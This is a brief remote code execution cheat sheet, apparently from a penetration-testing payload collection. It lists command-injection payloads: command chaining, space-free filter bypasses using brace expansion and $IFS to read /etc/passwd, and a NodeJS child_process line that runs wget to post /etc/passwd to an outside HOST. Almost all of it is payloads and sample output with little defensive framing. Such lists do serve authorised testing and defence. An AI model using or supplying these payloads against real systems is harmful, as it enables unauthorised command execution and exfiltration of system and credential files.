# Remote Code Execution
Remote code execution is a security vulnerability that allows an attacker to execute codes from a remote server.
	

## Exploits
Normal code execution
```
cat /etc/passwd 
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
bin:x:2:2:bin:/bin:/bin/sh 
sys:x:3:3:sys:/dev:/bin/sh
```

Code execution by chaining commands
```
original_cmd_by_server; ls
original_cmd_by_server && ls
original_cmd_by_server | ls
```

Code execution without space
```
swissky@crashlab▸ ~ ▸ $ {cat,/etc/passwd}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ cat$IFS/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
RCE
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

NodeJS Code execution
```
require('child_process').exec('wget+--post-data+"x=$(cat+/etc/passwd)"+HOST')
```

## Thanks to
* 